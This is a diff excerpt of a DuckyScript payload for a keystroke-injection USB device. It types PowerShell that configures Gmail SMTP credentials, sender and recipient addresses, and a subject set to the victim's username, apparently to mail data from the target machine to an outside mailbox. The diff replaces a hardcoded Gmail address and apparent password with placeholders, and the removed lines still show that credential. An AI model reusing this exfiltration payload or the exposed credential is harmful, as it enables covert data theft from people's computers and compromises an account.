@@ -95,16 +95,16 @@ STRING $SMTPInfo.EnableSSL = $true
 ENTER
 DELAY 100
 REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('rubbersendducky@gmail.com', 'HLrGwdYXnNDwE4Qa')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDEMAIL@gmail.com', 'SENDEMAIL PASSWORD')
 ENTER
 DELAY 100
 STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
 ENTER
 DELAY 100
-STRING $E.From = 'rubbersendducky@gmail.com'
+STRING $E.From = 'SENDEMAIL@gmail.com'
 ENTER
 DELAY 100
-STRING $E.To.Add('rubberreceiveducky@gmail.com')
+STRING $E.To.Add('RECEIVEEMAIL@gmail.com')
 ENTER
 DELAY 100
 STRING $E.Subject = $env:UserName
